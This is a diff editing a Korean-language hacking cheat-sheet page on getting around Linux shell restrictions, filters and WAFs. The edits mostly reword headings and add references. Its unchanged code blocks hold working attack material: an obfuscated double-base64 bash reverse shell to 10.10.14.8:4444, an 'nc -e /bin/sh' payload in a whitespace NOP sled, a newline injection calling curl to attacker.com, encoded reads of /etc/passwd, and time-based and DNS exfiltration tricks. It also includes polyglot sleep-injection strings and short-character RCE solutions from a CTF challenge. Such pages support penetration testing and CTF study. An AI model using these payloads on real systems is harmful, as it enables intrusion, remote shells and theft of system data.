@@ -1,12 +1,12 @@
 # Linux 제한 우회
 
-{{#include ../../../banners/hacktricks-training.md}}
-
 ## 일반적인 제한 우회
+
+PayloadsAllTheThings, Bo0oM의 cheat sheet 및 링크된 두 Secjuice 문서의 command-injection 및 WAF-evasion 컬렉션은 이 섹션의 shell-syntax 변형을 이해하는 데 필요한 배경 지식을 제공합니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
-# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
+# Double-Base64 payload
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Bypass 경로 및 금지된 단어
+### 우회 경로 및 금지된 단어
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -114,7 +114,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### hex encoding을 이용한 Bypass
+### hex encoding을 사용한 우회
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -129,7 +129,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### 시간 기반 데이터 유출
+### 시간 기반 data exfiltration
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -138,14 +138,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS data exfiltration
+### DNS 데이터 exfiltration
 
-예를 들어 **burpcollab** 또는 [**pingb**](http://pingb.in)를 사용할 수 있습니다.
+out-of-band callback을 위해 Burp Collaborator와 같은 collaborator 스타일 service를 사용하면 대상 애플리케이션이 외부 서버와 상호 작용하도록 유도할 수 있습니다. 기존 [**pingb**](http://pingb.in) 링크는 현재 사용 가능하다는 의미가 아니라 과거의 탐색 경로로 유지됩니다.<sup>[[6]](#references)</sup>
 
 ### Builtins
 
-외부 함수를 실행할 수 없고 **RCE를 수행하기 위해 제한된 builtins 집합에만 접근할 수 있는 경우**, 이를 수행하는 데 유용한 몇 가지 트릭이 있습니다. 일반적으로 **모든** **builtins**를 사용할 수는 없으므로 jail을 우회하기 위해 시도할 수 있는 **모든 옵션을 알고 있어야 합니다**. 아이디어 출처: [**devploit**](https://twitter.com/devploit).\
-먼저 모든 [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**을** 확인하세요. 그런 다음 여기 몇 가지 **권장 사항**이 있습니다:
+제한된 shell에서는 사용 가능한 builtin이 이러한 예제에서 사용할 수 있는 나머지 명령 표면입니다. Bash는 builtin 명령과 실행 문법을 문서화하고 있습니다.<sup>[[7]](#references)</sup> [**devploit**](https://twitter.com/devploit)에서 얻은 아이디어입니다.\
+기존 [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) 탐색으로 시작한 다음, 다음 Bash 전용 기법을 시도해 보세요.<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,20 +202,24 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### 가능한 정규식 우회
+### 잠재적인 regex 우회
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
+
+다음 명령은 open-source Bash obfuscation framework인 Bashfuscator를 사용하며, 코드 주석의 repository link는 탐색을 위해 유지됩니다.<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### 5자만으로 RCE
+### 5자 RCE
+
+다음의 두 가지 역사적인 5자 예시는 challenge 재현을 위해 유지되었습니다. 기본 challenge repository는 [Orange Tsai’s repository](https://github.com/orangetw/My-CTF-Web-Challenges)에서 확인할 수 있으며, code block의 두 번째 write-up 링크는 현재 이용 가능 여부가 확인되지 않은 탐색용 링크입니다.<sup>[[9]](#references)</sup>
 ```bash
-# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
-#Oragnge Tsai solution
+# From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
+#Orange Tsai solution
 ## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
 http://host/?cmd=>ls\
 http://host/?cmd=ls>_
@@ -259,7 +263,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### 4글자로 RCE
+### 4자로 RCE
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -294,15 +298,15 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Read-Only/Noexec/Distroless Bypass
+## Read-Only/Noexec/Distroless 우회
 
-**read-only 및 noexec protections**가 적용된 filesystem 내부에 있거나 distroless container 안에 있더라도, 여전히 **shell을 포함한 arbitrary binaries를 execute하는 방법이 있습니다!:**
+**read-only 및 noexec 보호**가 적용된 filesystem 내부에 있거나 **distroless image**를 사용하는 경우, 환경에는 Linux `mount(8)` 및 Distroless project에 문서화된 실행 제약이 적용됩니다. 링크된 페이지에는 이러한 제약 내에서 작업하기 위한 techniques가 정리되어 있습니다.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot 및 기타 Jail Bypass
+## Chroot 및 기타 Jail 우회
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -310,23 +314,23 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-vulnerability를 통해 최종적으로 `system()` 또는 다른 shell에 전달되는 argument를 부분적으로 control할 수 있는 경우, payload 실행이 시작되는 정확한 offset을 모를 수 있습니다.  Traditional NOP sled(예: `\x90`)는 shell syntax에서 **작동하지 않지만**, Bash는 command를 실행하기 전에 앞에 있는 whitespace를 문제없이 무시합니다.
+취약점으로 인해 최종적으로 `system()` 또는 다른 shell에 전달되는 argument를 부분적으로 제어할 수 있는 경우, payload offset이 불확실할 수 있습니다. Alan Cao와 Will Tan은 shell payload를 memory-mapped NVRAM에 뿌리고 앞에 spaces를 추가한, 제약이 있는 embedded-device 사례를 설명합니다.<sup>[[5]](#references)</sup>
 
-따라서 실제 command 앞에 긴 공백 또는 tab 문자 sequence를 추가하여 *Bash용 NOP sled*를 만들 수 있습니다:<sup>[[5]](#references)</sup>
+따라서 실제 command 앞에 긴 spaces 또는 tab characters 시퀀스를 추가하여 *Bash용 NOP sled*를 만들 수 있습니다. Bash는 simple command에서 words를 구분하는 blanks로 spaces와 tabs를 정의합니다.<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-ROP chain(또는 어떤 memory-corruption primitive)이 space block 내부의 어느 위치에든 instruction pointer를 배치하면, Bash parser는 `nc`에 도달할 때까지 whitespace를 단순히 건너뛰므로 명령을 안정적으로 실행합니다.
+ROP chain(또는 다른 memory-corruption primitive)이 space block 내 어느 위치에서든 시작하는 command-string 포인터를 전달하면, Bash는 command에 도달할 때까지 남아 있는 선행 공백을 파싱할 수 있습니다. 인용된 router exploit에서는 이를 통해 불확실한 string offset을 사용할 수 있었습니다.<sup>[[5]](#references)[[7]](#references)</sup>
 
-실용적인 사용 사례:
+제약이 있는 embedded target에서의 실용적인 사용 사례는 다음과 같습니다.<sup>[[5]](#references)</sup>
 
-1. **메모리 매핑된 configuration blob**(예: NVRAM)으로, 여러 프로세스에서 접근할 수 있는 경우
-2. 공격자가 payload를 정렬하기 위해 NULL 바이트를 기록할 수 없는 상황
-3. BusyBox `ash`/`sh`만 사용할 수 있는 embedded device – 이들도 선행 공백을 무시합니다.
+1. **Memory-mapped configuration blobs**(예: NVRAM) — 프로세스 간에 접근할 수 있습니다.<sup>[[5]](#references)</sup>
+2. 공격자가 payload 정렬을 위해 NULL byte를 쓸 수 없는 payload channel(일반적인 alignment 문제의 응용).<sup>[[5]](#references)</sup>
+3. 작은 BusyBox `ash`/`sh` 환경을 사용하는 embedded device. BusyBox는 resource-constrained system에서 이를 applet으로 문서화합니다.<sup>[[10]](#references)</sup>
 
-> 🛠️  이 기법을 `system()`을 호출하는 ROP gadget과 결합하면, 메모리가 제한된 IoT router에서 exploit reliability를 크게 높일 수 있습니다.
+> 🛠️ 통제된 lab에서 이 technique을 `system()`을 호출하는 ROP gadget과 결합하세요. 인용된 router research는 제약이 있는 hardware에서 이 조합을 시연합니다.<sup>[[5]](#references)</sup>
 
 ## References
 
@@ -334,6 +338,12 @@ ROP chain(또는 어떤 memory-corruption primitive)이 space block 내부의 �
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 - [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
-
+- [5] [Alan Cao and Will Tan — 버려진 hardware의 zero day exploit — Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
+- [7] [bash(1) — Linux manual page](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+- [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
+- [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
+- [11] [mount(8) — Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
 {{#include ../../../banners/hacktricks-training.md}}
